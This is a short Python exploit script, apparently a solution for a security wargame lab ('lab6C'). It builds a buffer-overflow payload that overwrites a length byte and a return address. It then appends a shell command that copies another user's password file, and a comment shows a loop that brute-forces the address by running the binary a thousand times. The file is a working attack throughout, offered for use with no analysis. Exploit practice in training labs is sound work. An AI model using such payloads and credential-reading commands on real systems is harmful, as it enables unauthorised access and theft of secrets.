import struct

# for i in {1..1000}; do lab06/lab6C < /vagrant/payload ;done

def p(x):
    return struct.pack("<I", x)

payload = ""
payload += "A" * 40
payload += "\xFF" # Overwrite the msglen
payload += "B" * 282
payload += p(0xb77d872b)
payload += "\n"
payload += "cat /home/lab6B/.pass > /tmp/flag"
payload += "\n"

print payload
